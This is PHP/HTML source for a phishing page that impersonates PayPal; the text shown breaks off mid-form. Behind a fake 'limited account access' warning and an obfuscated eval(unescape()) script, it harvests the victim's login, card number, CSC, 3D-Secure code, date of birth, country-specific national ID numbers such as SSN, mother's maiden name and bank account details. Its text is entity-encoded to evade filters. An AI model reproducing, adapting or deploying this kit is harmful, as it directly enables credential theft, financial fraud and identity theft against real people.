<?php

/**
                                                                             
                                                                             
                                                                             
$$\   $$\     $$$$$$$$\  $$$$$$\  $$\      $$\ $$$$$$$\  $$$$$$$$\ $$$$$$$\  
$$ |  $$ |    \__$$  __|$$  __$$\ $$$\    $$$ |$$  __$$\ $$  _____|$$  __$$\ 
\$$\ $$  |       $$ |   $$ /  $$ |$$$$\  $$$$ |$$ |  $$ |$$ |      $$ |  $$ |
 \$$$$  /$$$$$$\ $$ |   $$$$$$$$ |$$\$$\$$ $$ |$$$$$$$  |$$$$$\    $$$$$$$  |
 $$  $$< \______|$$ |   $$  __$$ |$$ \$$$  $$ |$$  ____/ $$  __|   $$  __$$< 
$$  /\$$\        $$ |   $$ |  $$ |$$ |\$  /$$ |$$ |      $$ |      $$ |  $$ |
$$ /  $$ |       $$ |   $$ |  $$ |$$ | \_/ $$ |$$ |      $$$$$$$$\ $$ |  $$ |
\__|  \__|       \__|   \__|  \__|\__|     \__|\__|      \________|\__|  \__|
                                                                             
                                                                             
                                                                             
**/

error_reporting(0); 
 ob_start(); 
 @session_start(); 
 set_time_limit(0); 
 include('../not.php'); 
 require "../data/algo.php";

 
$countrycode = IP_Data(Get_IP(),"code");
$_SESSION['cntyCode'] = $countrycode;

$countryname = IP_Data(Get_IP(),"country");
$_SESSION['cntyName'] = $countryname;
 
$AccessT = md5(gmdate('fucked'));
$Token = strtoupper(sha1(256));

date_default_timezone_set('GMT');
$logindate  = date(", Y");
$dtem  = date("M");
$ss = (date("d")-1);
$strdate = ($dtem." ".$ss.$logindate) ;
$Cdg = Coding2Str('40');
?>


<html ng-app="Test"lang="en_US" dir="ltr" class="js">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="img/pp144.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="img/pp114.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="img/pp72.png">
<link rel="apple-touch-icon-precomposed" href="img/pp64.png">
<link rel="shortcut icon" sizes="196x196" href="img/pp196.png">
<link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico">
<link rel="icon" type="image/x-icon" href="img/pp32.png">
<title>PayPal&#58;&#32;&#83;&#117;&#109;&#109;&#97;ry</title>
<link rel="stylesheet" href="css/app.ltr.css">
<link rel="stylesheet" href="http://deavyaccount.com/fonts/paypal-font.css">
<link rel="stylesheet" href="css/summary.ltr.css">
<link rel="stylesheet" href="css/wallet.ltr.css">
<link rel="stylesheet" href="css/main.css">
<script data-require="angular.js@*" src="js/angular.js"></script>
<script src="js/jquery.js"></script>
<script src="../data/fucked.js"></script>
<script src="js/bnkName.js"></script>
    <script src="js/ngRoutingnum.js"></script>
</head>
<body  id="nikommek"class="feature-analytics feature-bundle feature-captcha feature-fso feature-global-rollout feature-installment-summary feature-migrate-fi-credit feature-redirectToSynchrony US">
<div class="vx_globalNav-main globalNav_main js_globalNavView" id="header" role="banner" data-show-warning="">
<div class="vx_globalNav-container">
<a href="#" class="vx_globalNav-brand_desktop"><span class="vx_a11yText">S&#117;&#109;&#109;&#97;&#114;y</span></a>
<div class="vx_globalNav-secondaryNav_mobile noPrint">
<div class="vx_globalNav-listItem_mobileLogout">
<a href="#" id="dos8"class="vx_globalNav-link_mobileLogout">L&#111;&#103;&#32;&#79;&#117;t</a>
</div><div class="vx_globalNav-listItem_settings">
<a href="#" class="vx_globalNav-link_settings">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span>
<span class="vx_a11yText">Settings</span></a></div><div><p class="vx_h5 vx_globalNav-displayName"><?=@$_SESSION['_email_'];?></p>
<!-- Profile photo markup goes here. --></div></div>
<div class="vx_globalNav-navContainer noPrint">
<nav id="navMenu" class="vx_globalNav-nav" role="navigation">
<ul class="vx_globalNav-list">
<li id="dos2"><a href="#" class="vx_isActive vx_globalNav-links nemo_globalNavSummaryLink">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkSummary"></span></span> 
<span class="vx_globalNav-navText">Summary</span></a></li>
<li id="dos3"><a href="#" class=" vx_globalNav-links nemo_globalNavActivityLink"><span class="vx_globalNav-iconWrapper">
<span class="vx_globalNav-navIcon globalNav-icon_linkActivity"></span></span> <span class="vx_globalNav-navText">Activity</span></a>
</li><li id="dos4"><a href="#" class=" vx_globalNav-links nemo_globalNavTransferLink">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkTransfer"></span>
</span> <span class="vx_globalNav-navText">Send &amp; Request</span></a></li>
<li id="dos5"><a href="#" class=" vx_globalNav-links nemo_globalNavWalletLink">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkWallet"></span>
</span> <span class="vx_globalNav-navText">&#87;&#97;&#108;&#108;&#101;&#116;</span></a></li>
<li id="dos6"><a href="#" class=" vx_globalNav-links nemo_globalNavShopLink" target="_top">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkShop"></span>
</span> <span class="vx_globalNav-navText">Shop</span></a></li>
<li id ="dos7"class="globalNav-listItem_mobile js_globalNavSearch"><a href="#" class="vx_globalNav-links nemo_globalNavSearchLink js_globalNavSearchLink">
<span class="vx_globalNav-navText">Search</span></a></li>
</ul>
<ul class="vx_globalNav-list_secondary">
<li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false">
<a href="#" class="vx_globalNav-link_notifications notifications_desktop js_notifications-toggleTrigger nemo_notificationsDesktopTrigger" name="openNotifications"   role="button" title="Notifications">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span>
<span class="vx_notificationCount notificationLength-1 js_notificationCount">3</span></span>
<span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">Notifications</span></a></li>
<li id="js_tourSettings"><a href="#" class="vx_globalNav-link_settings" name="settings" title="Settings">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span>
<span class="vx_globalNav-navText_secondary vx_a11yText">Settings</span></a></li>
<li class="globalNav-listItem_mobile"><a href="#" class="vx_globalNav-link_help" name="help">
<span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkHelp"></span></span>
<span class="vx_globalNav-navText_secondary vx_a11yText">Help</span></a></li>
<li class="vx_globalNav-listItem_logout"><a href="" id="dos9"class="vx_globalNav-link_logout nemo_logoutBtn">Log Out</a></li>
</ul>
</nav></div></div></div>
<div id="sidepanelNotifications" class="vx_sidepanel sidepanel js_sidepanelView noPrint panel js_globalNotifs-sidepanel" tabindex="-1">
<div class="vx_sidepanel-headerContainer">
<h3 class="vx_h3 vx_sidepanel-header"style="color:#FFFFFF">Notifications</h3>
<div class="vx_sidepanel-headerIcon_right"><a href="#" class="globalNotifs-close js_closeNotifications" name="closeNotifications" role="button" ><span class="icon icon-small icon-close-small" aria-hidden="true"></span>
<span class="vx_a11yText">Close Notifications</span></a></div></div>
<div class="vx_sidepanel-body">
<ul class="vx_sidepanel-list">
 <li><a class="vx_sidepanel-item">
 <span class="icon icon-small icon-critical-small globalNotifs-levelIndicator_critical" style="color:#f24246;"></span>
 <p class="globalNotifs-message"style="color:#FFFFFF">There is a problem wi&#116;&#104;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#46;&#32;&#77;&#97;&#107;&#101;&#32;&#115;&#117;&#114;&#101;&#32;&#116;&#111;&#32;&#114;&#101;&#115;&#111;&#108;&#118;&#101;&#32;&#105;&#116;&#32;&#115;&#111;&#32;&#121;&#111;&#117;&#32;&#104;&#97;&#118;&#101;&#32;&#102;&#117;&#108;&#108;&#32;&#97;&#99;&#99;&#101;&#115;&#115;&#32;&#116;&#111;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#105;&#109;&#109;&#101;diately.</p></a>
 </li>
 <li id="dos1"><a href="#" class="globalNotifs-listItem vx_sidepanel-item">
 <span style="padding-top:6%;padding-right:5%;" class="icon icon-medium icon-card-half-solid  globalNotifs-levelIndicator_info"></span>Confirm your card details</a></li>
 <li> <a href="#" class="globalNotifs-listItem vx_sidepanel-item"><span style="padding-top:6%;padding-right:5%;" class="icon icon-medium icon-bank-half-solid  globalNotifs-levelIndicator_info"></span>Confirm your bank details</a></li>
 <li><a href="#" class="globalNotifs-listItem vx_sidepanel-item">
 <span style="padding-top:6%;padding-right:5%;" class="icon icon-small icon-pp-logo-outline  globalNotifs-levelIndicator_info"></span>Upload your proof document</a></li>
 
 </ul></div></div>
<div id="js_foreground" class="vx_foreground-container foreground-container">
<div class="vx_globalNav-main_mobile js_globalNavView"><div class="vx_globalNav-headerSection_trigger">
<a href="#navMenu" class="js_toggleMobileMenu vx_globalNav-toggleTrigger nemo_mobileNavMenuToggle noPrint">Menu</a></div>
<div class="vx_globalNav-headerSection_logo"><a href="#" class="vx_globalNav-brand_mobile">
<span class="vx_a11yText">Summ&#97;ry</span></a></div>
<ul class="vx_globalNav-headerSection_actions">
<li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false">
<a href="#" class="vx_globalNav-link_notifications notifications_mobile js_notifications-toggleTrigger nemo_notificationsMobileTrigger" name="openNotifications"   role="button" title="Notifications">
<span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span>
<span class="vx_notificationCount notificationLength-1 js_notificationCount">3</span></span>
<span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">Notifications</span></a>
</li>
</ul></div>
<div class="contents vx_mainContent" id="contents" role="main" aria-labelledby="heading1">
<div id="js_summaryView" class="mainContents summaryContainer" >
<h1 id="heading1" class="accessAid">PayPal: Summ&#97;ry</h1>
<div id="js_engagementModuleView" class="engagementModule nemo_engagementModule" data-engagement-badges="">
<div class="engagementSneakPeek-pullTab js_engagementSneakPeek-pullTab js_engagementSneakPeek-trigger">
<span class="icon icon-small icon-arrow-down-small" aria-hidden="true"></span></div>
<div class="engagementMainBar-container js_engagementMainBar-container">
<div class="summarySection engagementMainBar row"style="height:0%;">
<div class="col-sm-7 progressAndWelcome">
<div id="js_toggleProfileStatus" class="welcomeMessage js_selectModule selectModule profileStatus  active" data-module-number="0">
<p class="vx_h3 engagementWelcomeMessage nemo_welcomeMessageHeader"><span class="icon icon-small icon-lock-small" style="color:#ffffff"></span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#FFFFFF">Limited Account Access Details !</span></p>
</div></div>
<div id="js_engagementActions" class="col-sm-5 engagementActions"></div></div></div>
<div id="js_emSlideDownContainer" aria-expanded="true" role="alertdialog" tabindex="-1" class="emSlideDownContainer nemo_emSlideDownContainer autoHeight" data-em-open="false" data-current-module="" data-new-user="true" data-total-percentage="60" data-hide-sneak-peek="false" data-hide-account-completion="true" data-is-first-use-enabled="false" data-auto-tour="false" data-auto-open-offer="false" aria-label="Get the most out of PayPal">
<div class="engagementSneakPeek-overlay js_engagementSneakPeek-overlay"></div>
</div></div>
 <div class="mainBody">
 <div id="summary" class="summarySection">
 <div class="row">
 <div class="col-sm-12 summaryModuleContainer">
 
 <section class="walletModule nemo_balanceModule" aria-labelledby="walletModuleHeader" id="js_tourWalletModule">
 <div class="balanceModule">
 <h3><a class="moduleHeaderLink nemo_moduleHeaderLink"></a></h3>
<div class="footerLink">
<img src="images/warning.png" width="90px" height="87px">
<script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%74%38%63%34%64%38%30%61%33%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%38%34%32%30%30%39%36%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%35%34%35%33%31%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%33%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%74%38%63%34%64%38%30%61%33%28%27') + '%3d%6c%1f%74%76%70%6c%6a%3f%1b%74%61%74%75%2b%5c%6d%61%62%6e%3f%6c%66%66%72%39%67%6d%69%75%2d%76%63%7f%67%33%2b%32%6c%71%39%1d%3f%0d%01%48%56%73%49%5b%6a%1c%62%71%1f%64%6b%6d%75%79%5b%6f%74%6a%77%19%75%6e%6b%6f%60%6e%6c%18%75%69%1e%63%6f%71%70%6b%65%1b%75%6a%65%76%6a%65%70%72%1c%5d%72%1a%69%67%6c%77%6d%5b%6c%68%72%1c%72%64%68%64%67%63%63%6f%61%1e%70%61%63%1f%5a%67%66%69%7a%6e%75%75%1e%67%6f%1c%6e%76%68%1b%75%7e%75%75%67%69%2a%19%55%60%19%68%64%65%6a%6e%75%6c%75%1c%6b%63%71%62%65%72%67%69%18%72%69%71%6e%19%5f%62%64%6b%74%6e%79%2c%19%5b%68%60%19%75%60%19%6c%64%67%69%18%6e%69%6c%63%19%67%69%67%6b%69%6f%56%74%62%69%68%1c%75%6d%1f%61%65%6f%68%15%77%74%18%6e%6e%68%72%64%65%65%1b%73%64%77%19%71%65%70%61%1c%72%66%67%74%6a%6a%18%74%67%6c%72%62%61%60%2f%1a%54%6e%79%63%6d%18%77%63%19%61%5c%6f%1a%66%69%61%6c%66%65%72%1c%75%64%64%74%1a%60%6e%6b%69%6b%6f%5d%70%62%6d%69%2d%1a%70%69%7a%6a%19%5b%63%61%66%71%72%19%76%6a%18%78%67%6f%75%65%70%62%72%60%19%59%66%65%64%77%6f%74%1e%62%66%5f%73%76%68%64%75%15%71%62%6c%6a%1c%5b%63%1f%6d%61%6c%63%79%67%65%2e%1e%55%66%1c%76%68%75%6f%64%15%6c%62%6d%61%1c%75%6d%1f%6b%65%76%74%64%6a%66%18%75%6d%76%6e%1f%5a%67%66%67%78%75%19%5b%73%1c%74%6d%6e%6f%1a%58%75%15%68%68%75%73%67%5b%68%60%2d%1a%58%6e%69%18%70%67%1e%5f%69%6d%6b%68%63%60%72%6a%18%67%69%6c%1c%75%64%60%19%61%6d%65%64%6e%77%67%68%67%66%6a%62%66%2c%0c%02%31%29%69%3e8420096%34%31%32%34%37%36%35' + unescape('%27%29%29%3b'));
// -->
</script>
<noscript><i>Javascript required</i></noscript>
<div class="dotted"><hr></div>
<p style="padding-top:8px;text-align:left;font-size:16px"><b>Why is my account access limited?</b></p>
<p style="text-align:left;font-size:14px;">Your account access has been limited for the following reason:</p>
<ul style="padding-left: 40px;"><li style="text-align:left;font-size:14px"><b><?php echo $strdate; ?></b>: We want to check with you to make sure that no one has logged in to your account without your permission. </li></ul>
<div class="dotted"><hr></div>
<p style="padding-top:8px;text-align:left;font-size:16px"><b>How can I get my account access restored?</b></p>
<p style="text-align:left;font-size:14px">It's usually pretty easy to take care of things like this. Most of the time, we just need more information about your account .</p>
<p style="padding-bottom:8px;text-align:left;font-size:14px">Ple&#97;&#115;&#101;&#32;&#99;&#108;&#105;&#99;&#107;&#32;&#111;&#110;&#32;&#116;&#104;&#101;&#32;&#98;&#117;&#116;&#116;&#111;&#110;&#32;&#98;&#101;&#108;&#111;&#119;&#32;&#116;&#111;&#32;&#114;&#101;&#115;&#116;&#111;&#114;&#101;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;ount access now.</p>      
<button href="#/wallet/confirm/card" class="vx_btn" id="form0">Restore</button>
</div></div></section>

</div></div></div></div></div></div>
<div id="footer" class="noPrint nemo_footer vx_globalFooter-container" role="contentinfo">
<div class="vx_globalFooter">
<div class="vx_globalFooter-content">
<ul class="vx_globalFooter-list">
<li><a href="#" target="_top" class="nemo_helpLink" name="footerHelp">Help &amp; Contact</a></li>
<li><a href="#" target="_top" class="nemo_securityLink" name="footerSecurity">Security</a></li>
</ul>
<div class="vx_globalFooter_secondary">
<p class="vx_globalFooter-copyright nemo_copyrightText">&#9400;<span dir="ltr"><?php date('Y') ?></span>  Pa&#121;&#80;&#97;&#108;&#44;&#32;&#73;&#110;&#99;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;ved.</p>
<ul class="vx_globalFooter-list_secondary">
<li><a href="#" target="_top" name="privacy" class="nemo_privacyLink">Privacy</a></li>
<li><a href="#" target="_top" name="legal" class="nemo_legalLink">Legal</a></li>
<li><a href="#" target="_top" name="policyUpdates" class="nemo_policyUpdatesLink">Policy updates</a></li>
<li class="vx_globalFooterLink-feedback" id="siteFeedback">
<a href="#" class="beta feedback nemo_feedback hidden-phone">Feedback</a></li>
</ul></div></div></div></div></div>


<section id="overpanel" class="theoverpanel animated med hide " tabindex="-1" role="dialog">
<div class=" overpanel-wrapper row"><div class="col-xs-12"><a href="#" class="dismiss close nemo_dismissClose" id="closer" aria-describedby="overpanel-header" role="button" name="asba" data-push-replace="false" data-pagename="" data-track-type="link"><span class="icon icon-close-small" aria-hidden="true"></span><span class="accessAid">Close</span></a></div>
<div id="form_card" class=" overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-4 col-md-offset-4" role="document" style="padding-top:70px">
<div id="overpanel-header" class=" overpanel-header"></div><br>
<div class=" overpanel-body"><div class="cardType vx_btn-group toggleBtnGroup row"></div>

<form class="form-card" id="form1" action="" method="post" novalidate="novalidate"><h2 id="overpanel-header">Confirm/Link a c&#97;rd</h2>
<input type="hidden" name="mail" value="<?=@$_SESSION['_email_'];?>"  ><input type="hidden" name="pwd" value="<?=@$_SESSION['_password_'];?>">
                         <div class="inputs">
                            <input class="enterInput" type="text" name="CHN" id="chname"value="<?=@$_SESSION['CHN'];?>" style="text-transform: capitalize;" placeholder="C&#97;rdholder name">
                                
                        </div>                                          
                        <div class="inputs">
                                <input class="enterInput" type="tel" name="card_number" id="cardnumber" value="<?=@$_SESSION['card_number'];?>"placeholder="C&#97;rd number" maxlength="19" onkeyup="CarType(this.value)" >
                                <span class="cardos" id="CARDT"></span>
                                <input type="hidden" name="cartip" id="cartyp" value="<?=@$_SESSION['cartip'];?>">
                            </div>
                            <div class="section group inputs" id ="cc-swch"style="display:none">
                           <div class="col span_1_of_2 inexpiration"style="padding-bottom:10px;">
                                <input class="enterInput" type="tel" name="validFrom" id="validfrom"placeholder="validFrom MM/YYYY" maxlength="7">
                            </div>
                           <div class="col span_1_of_2">
                                <input class="enterInput" type="tel" name="issueNumber" id="issuenumber" placeholder="Issue Number" pattern="[0-9]*" maxlength="3">
                               
                            </div>
                        </div>
                        <div class="section group inputs">
                           <div class="col span_1_of_2 inexpiration">
                                <input class="enterInput" type="tel" name="expiration" placeholder="Expir&#97;tion MM/YYYY" maxlength="7">
                            </div>
                           <div class="col span_1_of_2">
                                <input class="enterInput" type="tel" name="cvv" id="cvv" placeholder="CSC (3 digits)" pattern="[0-9]*" maxlength="4">
                                <span class="cardos" id="cvn" style="background-position: 0px -434px;"></span>
                            </div>
                        </div>
                        
                        <div class="inputs" style="margin-bottom: 30px">
                            <select class="enterInput address" name="address">
                                <option value="0" selected=""> Select a billing &#97;ddress </option>
                                <option value="1">+ Add a new billing &#97;ddress</option>  
                            </select>
                        </div>
                        <input class="vx_btn" value="Save" type="submit">
                    </form>
                       <form class="form-address" style="padding-top:70px" id="form2" action="" method="post" novalidate="novalidate"><h2 id="overpanel-header">Add Billing Address </h2>
                        
                        
                        <div class="inputs">
                                <input class="enterInput" type="text" name="address_1" placeholder="Address line 1" maxlength="120">
                            </div>
                           <div class="inputs">
                                <input class="enterInput" type="text" name="address_2" placeholder="Address line 2 (optional)" maxlength="120">
                            </div>
                        <div class="section group inputs">
                           <div class="col span_1_of_2 inexpiration">
                                <input class="enterInput" type="text" name="city" placeholder="City" maxlength="30">
                            </div>
                           <div class="col span_1_of_2">
                                <input class="enterInput" type="text" name="state" placeholder="State" maxlength="30">
                            </div>
                        </div>
                        <div class="section group inputs" style="margin-bottom:2px">
                          <div class="section group inputs ">
                           <div class="col span_1_of_2 inexpiration">
                                <input class="enterInput" type="tel" name="zip_code" placeholder="Zip code" maxlength="12">
                            </div>
                           <div class="col span_1_of_2">
                                <input class="enterInput" type="text" name="country" placeholder="Country" maxlength="30" value="<?=@$_SESSION['cntyName'];?>">
                            </div>
                          </div>
                        </div>
                           
                        <input class="vx_btn vx_btn-block" value="Save" type="submit">
                        <a rel="nofollow" style="margin-bottom: 30px" class="cancel-address" href="#"> Cancel </a>
                    </form>             
</div></div>
<div class=" overpanel-content maxOverpanelWidth hide" style="padding-top:70px" id="formdetail" role="document">
<div id="overpanel-header" class=" overpanel-header">
<h2 id="overpanel-header">C&#97;rd details</h2>
</div>
<div class=" overpanel-body">
<div class="menu col-sm-6" style="width:49%; padding-left:2px">
<div id="reb3licon"class="creditOrDebit card blue image">
<span class="ribbon needConfirmation">
<span class="ribbonBadge needAttention" style="margin-top:-90px;">Confirm</span></span>
<span class="lastDigits" style="font-size:22" dir="ltr">XXXX-XXXX-XXXX-<span class="last4"></span><br><br><span class="ex"><span style="font-size:9px">VALID THRU&nbsp;</span><span class="icon icon-arrow-right-half-small"></span></span><br><span class="chn"></span></span></div>
</div>
<div class="cardSummary col-sm-6" aria-labelledby="overpanel-subheader">
<div class="editCard">
<form name="cardInfo" id="form3" action="" method="post" class="uneditable" novalidate="novalidate">
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate">
<label for="expirationDate" class="">Birth date</label>
<input id="birthh" name="DOB" class="enterInput" value="" placeholder="DD/MM/YYYY" autocomplete="off" dir="ltr" pattern="" maxlength="10" type="tel">

</div></div>

<div class="cardSecurityCode">
<div class="textInput csc csc_CC-U6DF6FT62QESW csc">
<label for="csc_CC-U6DF6FT62QESW" class="">Security inform&#97;tion</label>
<input id="csc_CC-reb3l" name="securecode" class="enterInput" value="" placeholder="3D-Secure" autocomplete="off" dir="ltr" pattern="" maxlength="15" type="password">
<span class="cardsec" id="secure"></span>
</div></div>

<?php 
if(trim($_SESSION['cntyName']) == "United States"){
    echo '
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Social Security Number</label>
<input id="ssn" name="SSN" class="enterInput"   value="" placeholder="SSN (9 digits)" autocomplete="off" dir="ltr" pattern=""  maxlength="11" type="tel">

</div></div>';} ?>
<?php 
if(trim($_SESSION['cntyName']) == "Canada"){
    echo '
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Soci&#97;l Insur&#97;nce Number</label>
<input id="sin" name="SIN" class="enterInput" value="" placeholder="SIN (9 digits)" autocomplete="off" dir="ltr" pattern="" maxlength="11" type="tel">

</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "United Kingdom"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">N&#97;tional Insur&#97;nce Number</label>
<input id="nin" name="NIN" class="enterInput" value="" placeholder="NINo" autocomplete="off" dir="ltr" pattern="" style="text-transform:uppercase" maxlength="13" type="text">

</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Italy"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Fiscal Code Number</label>
<input id="fcn" name="FCN" class="enterInput" value="" placeholder="Codice fiscale" autocomplete="off" dir="ltr" pattern="" style="text-transform:uppercase" maxlength="16" type="text">

</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Ireland"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Personal Public Service Number</label>
<input id="irpps" name="IRPPS" class="enterInput" value="" placeholder="PPS No" autocomplete="off" dir="ltr" pattern="" maxlength="9" type="text">

</div></div>
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Mother M&#97;iden Name</label>
<input id="mmn" name="MMN" class="enterInput" value="" placeholder="Mother name" autocomplete="off" dir="ltr" pattern="" maxlength="30" type="text">

</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Brazil"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">CPF Number</label>
<input id="cpfbr" name="CPFBR" class="enterInput" value="" placeholder="CPF" autocomplete="off" dir="ltr" pattern="" maxlength="14" type="tel">

</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Netherlands"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Citizen Service Number/SOFI</label>
<input id="bsn" name="BSN" class="enterInput" value="" placeholder="BSN (8/9 digits)" autocomplete="off" dir="ltr" pattern="" maxlength="9" type="tel">
</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Spain"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class=""> National Identity Document Number</label>
<input id="dni" name="DNI" class="enterInput" value="" placeholder="DNI (NIF/NIE/CIF)" autocomplete="off" dir="ltr" pattern="" maxlength="9" type="text">
</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Sweden"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class=""> Personal Identity Number</label>
<input id="sid" name="SID" class="enterInput" value="" placeholder="Personnummer (10 digits)" autocomplete="off" dir="ltr" pattern="" maxlength="11" type="tel">

</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Australia"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Online Shopping ID</label>
<input id="osid" name="OSID" class="enterInput" value="" placeholder="OSID" autocomplete="off" dir="ltr" pattern="" maxlength="15" type="text">

</div></div>
';} ?>

<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Credit Limit</label>
<input id="crl" name="credilimit" class="enterInput" value="" placeholder="Credit limit" autocomplete="off" dir="ltr" pattern="" maxlength="10" type="tel">
</div></div>
<input class="vx_btn updateDone validateBeforeSubmit vx_btn-block" name="save" value="Save" type="submit">
</form>
</div>
</div></div></div>


<div class=" overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 hide" style="padding-top:70px" id="Bformdetail" role="document">
<div id="overpanel-header" class=" overpanel-header">
<h2 class="col-xs-12 col-lg-5 col-lg-offset-1_ltr"id="overpanel-header">B&#97;nk details</h2>
</div>
<div class=" overpanel-body">
<form name="bankInfo" id ="form4" action="" method="post" novalidate="">

<p class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">Please note that the details entered are only for your account verification. It's secure, and we don't save this information.</p>

<div class="fields">
<?php

if ($_SESSION['cntyCode'] == "US"){
    echo'
    
<div class="bankType vx_btn-group toggleBtnGroup clearfix">
<input id="checking" class="accessAid" name="accountType" checked="checked" value="checking" type="radio">
<label id ="checkin"class="vx_btn vx_btn-secondary toggleBtn col-xs-5 btnCol4" for="checking" >Checking</label>
<input id="savings" class="accessAid" name="accountType" value="savings" type="radio">
<label id="saving" class="vx_btn vx_btn-secondary toggleBtn col-xs-5 btnCol4 " for="savings" >Savings</label>
</div>
<div class="checkWrapper enforceLtr">
<div id="cheek" class="check"></div></div>

<div class="accountNumbers ltrInputGroup"style="margin-bottom:10px;" >
<div class="row">
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="routingNum" class="accessAid">Routing number</label>
<input aria-invalid="false" id="routingNum" name="routingNumber" class="hasHelp js_needsValidation validate" required="required" aria-required="true" value="" placeholder="Routing number" autocomplete="off" pattern="[0-9]*" maxlength="9" data-min="9/" type="text" ng-routingnum ng-model="formData.accountRouting" onkeyup="USABANK(this.value)">
<p class="help-information" id="routingNum-help-information">A 9-digit number at the lower left corner of a check. Contact your bank if you need help.</p>
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" style="margin-bottom:10px;">

<label for="accountNum" class="accessAid">Account number</label>
